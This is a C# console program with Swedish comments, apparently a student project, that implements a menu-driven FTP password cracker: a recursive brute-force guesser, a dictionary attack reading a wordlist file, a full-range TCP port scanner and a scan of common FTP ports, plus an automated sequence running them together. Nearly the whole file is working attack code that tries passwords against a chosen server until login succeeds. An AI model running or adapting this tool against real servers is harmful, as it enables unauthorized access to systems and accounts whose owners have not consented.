using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;

namespace BF
{
    class Program
    {
        static string[] characters = "a b c d e f g h i j k l m n o p q r s t u v w x y z".Split(' ');
        static int length;
        static string username;
        static string IP;
        static int port;

        //Menu 
        public static void Menu()
        {
            bool exit = false;
            do
            {
                switch (GetMenuChoice())
                {
                    case 0: { return; }
                    case 1: { FtpProperties(); brute(new String[0]); exit = true; break; }
                    case 2: { FtpProperties(); DictionaryAttack(); break; }
                    case 3: { PortScan(); break; }
                    case 4:
                        {
                        AutomaticAttacks AutoAttack = new AutomaticAttacks();
                        AutomaticAttacks.AutoMaticFtpProperties();
                        AutomaticAttacks.AutoMaticPortScanSpecific();
                        AutomaticAttacks.AutoMaticDictionaryAttack();  
                        Console.WriteLine("Next attack will begin within 3 seconds"); 
                        Thread.Sleep(3000);
                        AutomaticAttacks.AutoMaticBrute(new String[0]); 
                        break;}
                    case 5: { FtpProperties(); PortScanSpecific(); break; }
                }
            } while (!exit);
        }


        static int GetMenuChoice()
        {
            do
            {
                int menuChoice;

                //Läser av värdet i menyn och "outar" det valet till menyChoice, valet måste va inom 0-4 annars felmed.
                if (int.TryParse(Console.ReadLine(), out menuChoice) && (menuChoice >= 0 && menuChoice <= 5))
                {
                    //Console.Clear();
                    return menuChoice;
                }
                else
                {
                    Menu();
                }
            } while (true);
        }

        //FtpPropeties is used to set values to the IP, port, username and lenght variables
        static string FtpProperties()
        {
            Console.Write("Ange önskad IP adress till FTP Servern: ");
            IP = Console.ReadLine();

            Console.Write("Ange önskad port: ");
            port = int.Parse(Console.ReadLine());
            
            if (port == 1)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("WARNING, no port selected, using standard port 21");
                Console.ResetColor();
                port = 21;
            }

            Console.Write("Ange önskat användarnamn: ");
            username = Console.ReadLine();

            Console.Write("Hur många tecken vill du pröva?: ");
            length = int.Parse(Console.ReadLine());


            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("===========================================");
            Console.ResetColor();

            return null;
        }


        //Mainmetoden som läser in presenationen ur Presentation classen och hämtar Menu metoden.
        public static void Main()
        {
            //Console.WindowHeight sätter längden på consolefönstret
            Console.WindowHeight = 38;

            Presentation wt = new Presentation();
            Presentation.GetMenu();
            Menu();
        }

        //Bruteforce attacken.
        static bool brute(String[] array, int curr = 0)
        {
            
            curr++;

            foreach (var character in characters)
            {
                var a = new List<String>(array);
                a.Add(character);
                var pass = String.Join("", a);

                Console.WriteLine(pass);
                ftp Ftp = new ftp ("ftp://" +IP, port, username, pass);

                
                if (Ftp.LoginCheck())
                {
                    while (true)
                    {
                        Console.Clear();
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Grattis, du är inloggad på Servern din sexige hunk!");
                        Thread.Sleep(700);
                        Console.ResetColor();
                        Console.Clear();
                        Console.ForegroundColor = ConsoleColor.Blue;
                        Console.WriteLine("Grattis, du är inloggad på Servern din sexige hunk!");
                        Console.ResetColor();
                        Thread.Sleep(700);
                        Console.Clear();
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("Grattis, du är inloggad på Servern din sexige hunk!");
                        Console.ResetColor();
                        Thread.Sleep(700);
                        Console.Clear();
                        Console.ForegroundColor = ConsoleColor.Magenta;
                        Console.WriteLine("Grattis, du är inloggad på Servern din sexige hunk!");
                        Console.ResetColor();
                        Thread.Sleep(700);

                    }

                }
                if (curr < length)
                {
                    if (brute(a.ToArray(), curr))
                    {
                        return true;                    }
                }
            }
            return false;
        }

        //Dictionary Attack method
        static bool DictionaryAttack()
        {
            int count = 0;

            try
            {
                //StreamReadern läser in sökvägen till textfilen med lösenorden
                using (StreamReader sr = new StreamReader(@"C:/hej.txt/textfile.txt"))
                {
                    //Läser in hela textfilen, lagrar den i en array och splittar sedan ord för ord.
                    string line = sr.ReadToEnd();
                    string[] words = line.Split();
                    
                    //prövar varje ord som lösenord från arrayen "words"
                    foreach (var word in words)
                    {
                        count++;
                        if (Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Escape)
                        {
                            Console.WriteLine("Exiting");
                            break;
                        }
                        ftp Ftp = new ftp("ftp://" + IP, port, username, word);
                        Console.WriteLine(word);
                        if (Ftp.LoginCheck())
                        {
                            Console.WriteLine("Grattis, du är inloggad på Servern din sexige hunk!");
                            return true;
                        }
                        else
                        {
                           // Console.WriteLine("Fel lösenord");
                        }
                        Console.WriteLine(count);
                    }

                }
                //När scanningen är slut
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("===============================");
                Console.WriteLine("Finished with dictinary attacks");
                Console.WriteLine("===============================");
                Console.ResetColor();

                ContinueOnKeyPressed();
                Main();

            }
            catch (Exception)
            {
                throw;
            }
            return false;
        }




        static bool ScanPort(IPAddress Address, int Port)
        {
            TcpClient Client = new TcpClient();
            try
            {
                // Försöker ansluta till den angivna adressen samt porten. 
                Client.Connect(Address, Port);

                //Stäng strömmen
                NetworkStream ClientStream = Client.GetStream();
                ClientStream.Close();

                //Stäng TCP anslutningen
                Client.Close();
            }
            catch (SocketException)
            {
                //Antag att socket excaption betyder att anslutningen misslyckades och därför 
                //är anslutningen misslyckad.
                return false;
            }
            return true;
        }


        public static void PortScan()
        {
            string ScanAddress;
            IPAddress ScanIPAddress;
            Console.WriteLine("Enter IP Address: ");
            ScanAddress = Console.ReadLine();

            try
            {
                
                ScanIPAddress = IPAddress.Parse(ScanAddress);

                Console.WriteLine("Port scanning {0} ({1})", ScanAddress, ScanIPAddress.ToString());

                //Räknare för öppna respektive stängda portar.
                int count = 0;
                int cPorts = 0;

                //Loopar igenom och scannar alla portar
                for (int Port = IPEndPoint.MinPort; Port < IPEndPoint.MaxPort; Port++)
                {
                    //Kontroll som lyssnar om Escape-tangenten trycks ned.
                    if (Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Escape)
                    {
                        Console.WriteLine("Exiting");
                        break;
                    }
                    else
                    {
                        Console.Write("Scanning port {0}: ", Port);
                        if (ScanPort(ScanIPAddress, Port))
                        {
                            Console.ForegroundColor = ConsoleColor.DarkGreen;
                            Console.WriteLine("OPEN");
                            Console.ResetColor();
                            count++;
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.DarkRed;
                            Console.WriteLine("CLOSED");
                            Console.ResetColor();
                            cPorts++;
                        }
                    }
                }


                //När scanningen är slut
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("============================");
                Console.WriteLine("Finished scanning all ports");
                Console.WriteLine("============================");
                Console.ResetColor();
                Console.WriteLine("Open ports: {0},",count);
                Console.WriteLine("Closed ports: {0},", cPorts);

                Console.ReadLine();
                ContinueOnKeyPressed();
                Main();
            }
                //Om error skulle uppstå.
            catch (Exception)
            {
                Console.WriteLine("Exception caught!");
            }
        }

        //Metod som scannar av specifika portar som FTP servern vanligtvis använder.
        static void PortScanSpecific()
        {
            string ScanAddress;
            IPAddress ScanIPAddress;
            ScanAddress = IP;

            try
            {
                ScanIPAddress = IPAddress.Parse(ScanAddress);

                Console.WriteLine("Port scanning {0} ({1})", ScanAddress, ScanIPAddress.ToString());

                //Räknare för öppna respektive stängda portar.
                int count = 0;
                int cPorts = 0;
                
                

                //portar att scanna
                List<int> ports = new List<int> { 20, 21, 22, 47, 69, 115, 152, 989, 990, 2121, 2811, 3305, 4993, 5402};
                
                //Loopar igenom och scannar alla portar
                foreach (var port in ports)
                {
                    Console.Write("Scanning port {0}: ", port);
                    if (ScanPort(ScanIPAddress, port))
                    {
                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                        Console.WriteLine("OPEN");
                        Console.ResetColor();
                        count++;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.DarkRed;
                        Console.WriteLine("CLOSED");
                        Console.ResetColor();
                        cPorts++;
                    }
                }



                //När scanningen är slut
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("============================");
                Console.WriteLine("Finished scanning all ports");
                Console.WriteLine("============================");
                Console.ResetColor();
                Console.WriteLine("Open ports: {0},", count);
                Console.WriteLine("Closed ports: {0},", cPorts);
                
            }
            //Om error skulle uppstå.
            catch (Exception)
            {
                Console.WriteLine("Exception caught!");
            }
        }
        
        //Method för att stanna programmet och fortsätta när en tangen trycks ned.
        static void ContinueOnKeyPressed()
        {
            Console.WriteLine("Tryck på en tangent för att gå tillbaka till startmenyn!");
            Console.ReadKey();
        }
    }
}